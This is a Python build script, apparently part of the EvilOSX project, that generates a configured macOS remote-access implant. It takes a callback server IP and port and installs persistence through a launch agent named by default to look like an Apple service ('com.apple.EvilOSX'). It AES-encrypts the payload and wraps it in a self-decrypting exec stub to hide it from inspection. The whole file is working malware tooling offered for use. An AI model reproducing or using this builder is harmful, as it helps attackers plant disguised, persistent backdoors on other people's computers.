#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""Builds EvilOSX which is run on the target system."""
__author__ = "Marten4n6"
__license__ = "GPLv3"

from __future__ import print_function

import os
import random
import string
from sys import exit

MESSAGE_INPUT = "\033[1m" + "[?] " + "\033[0m"
MESSAGE_INFO = "\033[94m" + "[I] " + "\033[0m"
MESSAGE_ATTENTION = "\033[91m" + "[!] " + "\033[0m"

try:
    raw_input          # Python 2
except NameError:
    raw_input = input  # Python 3


def random_string(size, numbers=False):
    """:return A randomly generate string of x characters."""
    name = ""
    for i in range(0, size):
        if not numbers:
            name += random.choice(string.ascii_letters)
        else:
            name += random.choice(string.ascii_letters + string.digits)
    return name


def get_aes_key():
    """:return A tuple containing the salt, key and IV."""
    output = os.popen("openssl enc -aes-256-cbc -k %s -P -md sha256" % random_string(69, numbers=True)).read()
    salt = ""
    key = ""
    iv = ""

    for line in output.split("\n"):
        line = line.replace(" ", "")

        if line.startswith("salt="):
            salt = line.split("=")[1]
        elif line.startswith("key="):
            key = line.split("=")[1]
        elif line.startswith("iv="):
            iv = line.strip().split("=")[1]
    return salt, key, iv


def main():
    build_input = os.path.dirname(os.path.realpath(__file__)) + "/EvilOSX.py"
    build_output = os.path.dirname(os.path.realpath(__file__)) + "/builds/EvilOSX-" + random_string(8) + ".py"

    if not os.path.exists(build_input):
        print(MESSAGE_ATTENTION + "Failed to find EvilOSX.py in current directory.")
        exit(0)
    if not os.path.exists("builds"):
        os.mkdir("builds")

    try:
        server_host = raw_input(MESSAGE_INPUT + "Server IP (where EvilOSX will connect to): ")
        server_port = int(raw_input(MESSAGE_INPUT + "Server port: "))
        launch_agent_name = raw_input(MESSAGE_INPUT + "Launch agent name (empty for com.apple.EvilOSX): ")
        disable_persistence = raw_input(MESSAGE_INPUT + "Disable persistence? [y/N] ").lower()

        if not launch_agent_name:
            launch_agent_name = "com.apple.EvilOSX"
        if not disable_persistence or disable_persistence == "n":
            disable_persistence = False
        else:
            disable_persistence = True

        if server_host.strip() == "":
            print(MESSAGE_ATTENTION + "Invalid server host.")
            exit(0)
        elif server_port == "":
            print(MESSAGE_ATTENTION + "Invalid server port.")
            exit(0)

        print(MESSAGE_INFO + "Configuring EvilOSX...")

        # Set variables
        with open(build_input, "r") as input_file, open(build_output, "w+") as output_file:
            for line in input_file:
                if line.startswith("# Random Hash: "):
                    output_file.write("# Random Hash: %s\n" % (
                        random_string(random.randint(10, 69), numbers=True)
                    ))
                elif line.startswith("SERVER_HOST = "):
                    output_file.write("SERVER_HOST = \"%s\"\n" % server_host)
                elif line.startswith("SERVER_PORT = "):
                    output_file.write("SERVER_PORT = %s\n" % server_port)
                elif line.startswith("DEVELOPMENT = "):
                    output_file.write("DEVELOPMENT = False\n")
                elif line.startswith("LAUNCH_AGENT_NAME = "):
                    output_file.write("LAUNCH_AGENT_NAME = \"%s\"\n" % launch_agent_name)
                elif line.startswith("DISABLE_PERSISTENCE = "):
                    output_file.write("DISABLE_PERSISTENCE = %s\n" % disable_persistence)
                else:
                    output_file.write(line)

        print(MESSAGE_INFO + "Encrypting with AES 256 (using system OpenSSL)...")

        # AES 256 encrypt the launcher
        with open("builds/tmp_file.py", "w+") as output_file:
            salt, key, iv = get_aes_key()

            print("[DEBUG] Salt: " + salt)
            print("[DEBUG] Key: " + key)
            print("[DEBUG] IV: " + iv)

            encrypt_command = "cat %s | base64 | openssl aes-256-cbc -e -a -k %s -iv %s -S %s -md sha256" % (
                build_output, key, iv, salt
            )
            encrypted = "".join(os.popen(encrypt_command).readlines()).replace("\n", "")

            output_file.write("#!/usr/bin/env python\n")  # The launch agent won't be able to run the script otherwise!
            output_file.write("# -*- coding: utf-8 -*-\n")
            output_file.write("# %s\n" % random_string(random.randint(10, 69), numbers=True))
            output_file.write("import os\n")
            output_file.write("exec(\"\".join(os.popen(\"echo %s | openssl aes-256-cbc -A -d -a -k %s -iv %s -S %s -md sha256 | base64 --decode\").readlines()))\n" % (
                encrypted, key, iv, salt
            ))

            # Replace the unencrypted file with the final encrypted version.
            os.rename("builds/tmp_file.py", build_output)

        print(MESSAGE_INFO + "Done! Built file located at: %s" % os.path.realpath(build_output))
    except ValueError:
        print(MESSAGE_ATTENTION + "Invalid server port.")


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n" + MESSAGE_INFO + "Interrupted.")
        exit(0)
